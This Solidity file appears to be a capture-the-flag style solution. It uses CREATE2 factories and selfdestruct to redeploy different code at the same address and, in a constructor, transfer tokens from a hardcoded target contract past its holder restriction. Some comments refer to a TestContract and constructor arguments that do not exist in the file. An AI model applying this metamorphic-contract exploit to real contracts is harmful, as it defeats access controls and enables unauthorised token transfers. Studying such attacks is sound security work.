// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract OnlyImAllowedToHaveTokens1 {
    function bye() external {
        selfdestruct(payable(msg.sender));
    }
}

contract OnlyImAllowedToHaveTokens2 {
    constructor() {
        Code code = Code(0x09c9D3c78797FF87AAEe6dB8aEb5C0a3227310C4);
        code.transfer(address(0xbd70d89667A3E1bD341AC235259c5f2dDE8172A9), 1);
    }

    function bye() external {
        selfdestruct(payable(msg.sender));
    }
}

interface Code {
    function mint(address receiver) external;
    function transfer(address to, uint256 amount) external;
}

contract Factory {
    // Returns the address of the newly deployed contract
    function deploy1(bytes32 _salt) public payable returns (address) {
        // This syntax is a newer way to invoke create2 without assembly, you just need to pass salt
        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
        return address(new OnlyImAllowedToHaveTokens1{salt: _salt}());
    }

    function deploy2(bytes32 _salt) public payable returns (address) {
        // This syntax is a newer way to invoke create2 without assembly, you just need to pass salt
        // https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
        return address(new OnlyImAllowedToHaveTokens2{salt: _salt}());
    }
}

// This is the older way of doing it using assembly
contract FactoryAssembly {
    event Deployed(address addr, uint256 salt);

    // 1. Get bytecode of contract to be deployed
    // NOTE: _owner and _foo are arguments of the TestContract's constructor
    function getBytecode() public pure returns (bytes memory) {
        bytes memory bytecode = type(OnlyImAllowedToHaveTokens1).creationCode;

        return abi.encodePacked(bytecode);
    }

    // 2. Compute the address of the contract to be deployed
    // NOTE: _salt is a random number used to create an address
    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }

    // 3. Deploy the contract
    // NOTE:
    // Check the event log Deployed which contains the address of the deployed TestContract.
    // The address in the log should equal the address computed from above.
    function deploy(bytes memory bytecode, uint256 _salt) public payable {
        address addr;

        /*
        NOTE: How to call create2

        create2(v, p, n, s)
        create new contract with code at memory p to p + n
        and send v wei
        and return the new address
        where new address = first 20 bytes of keccak256(0xff + address(this) + s + keccak256(mem[p…(p+n)))
              s = big-endian 256-bit value
        */
        assembly {
            addr :=
                create2(
                    callvalue(), // wei sent with current call
                    // Actual code starts after skipping the first 32 bytes
                    add(bytecode, 0x20),
                    mload(bytecode), // Load the size of code contained in the first 32 bytes
                    _salt // Salt from function arguments
                )

            if iszero(extcodesize(addr)) { revert(0, 0) }
        }

        emit Deployed(addr, _salt);
    }
}
